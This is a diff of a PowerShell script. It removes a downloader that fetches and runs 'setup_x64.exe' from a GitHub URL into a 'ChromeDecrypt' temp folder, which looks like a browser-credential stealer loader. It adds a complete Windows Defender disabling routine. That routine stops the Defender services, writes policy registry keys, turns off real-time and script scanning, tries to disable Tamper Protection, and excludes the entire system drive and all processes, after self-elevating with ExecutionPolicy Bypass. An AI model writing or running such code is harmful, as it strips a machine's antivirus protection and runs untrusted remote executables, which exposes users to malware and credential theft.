@@ -1,20 +1,66 @@
-# Simple Execution Script for setup_x64.exe
-# Downloads and runs with admin privileges
-
-# Create temp folder for download
-$tempFolder = "$env:TEMP\ChromeDecrypt"
-if (-not (Test-Path $tempFolder)) {
-    New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
+# Method 3: Complete Defender disable script
+function Complete-DefenderDisable {
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "  DISABLING WINDOWS DEFENDER COMPLETELY" -ForegroundColor Cyan
+    Write-Host "========================================" -ForegroundColor Cyan
+    
+    # 1. Stop and disable Defender service
+    Write-Host "[1] Stopping Defender services..." -ForegroundColor Yellow
+    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+    Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
+    Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue
+    
+    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
+    Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue
+    Set-Service -Name "Sense" -StartupType Disabled -ErrorAction SilentlyContinue
+    
+    # 2. Disable via registry (permanent)
+    Write-Host "[2] Modifying registry..." -ForegroundColor Yellow
+    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (-not (Test-Path $regPath)) {
+        New-Item -Path $regPath -Force | Out-Null
+    }
+    
+    # These are the Group Policy equivalents
+    New-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
+    New-ItemProperty -Path $regPath -Name "DisableAntiVirus" -Value 1 -PropertyType DWORD -Force | Out-Null
+    
+    # 3. Disable via PowerShell preferences
+    Write-Host "[3] Updating Defender preferences..." -ForegroundColor Yellow
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    
+    # 4. Disable Tamper Protection (if enabled)
+    Write-Host "[4] Disabling Tamper Protection..." -ForegroundColor Yellow
+    try {
+        Set-MpPreference -DisableTamperProtection $true -ErrorAction SilentlyContinue
+    } catch {
+        # Tamper protection might be controlled by admin
+    }
+    
+    # 5. Create exclusion for entire system drive
+    Write-Host "[5] Adding exclusions..." -ForegroundColor Yellow
+    $systemDrive = "${env:SystemDrive}\"
+    Add-MpPreference -ExclusionPath $systemDrive -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "*" -ErrorAction SilentlyContinue
+    
+    Write-Host "`n✅ Windows Defender has been disabled!" -ForegroundColor Green
+    Write-Host "⚠️  Restart your computer for changes to take full effect" -ForegroundColor Yellow
 }
 
-# Download URL
-$url = 'https://github.com/bunny1233/mynewscripts/raw/refs/heads/main/setup_x64.exe'
-$outputFile = Join-Path $tempFolder 'setup_x64.exe'
+# Check admin and run
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "This script requires administrator privileges!" -ForegroundColor Red
+    Write-Host "Restarting as administrator..." -ForegroundColor Yellow
+    Start-Sleep 2
+    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
 
-# Download the file
-Write-Host "Downloading setup_x64.exe..." -ForegroundColor Yellow
-Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
+Complete-DefenderDisable
 
-# Execute with admin privileges
-Write-Host "Running with admin privileges..." -ForegroundColor Yellow
-Start-Process -FilePath $outputFile -ArgumentList "-k all" -Verb RunAs
+# Keep window open
+Write-Host "`nPress any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
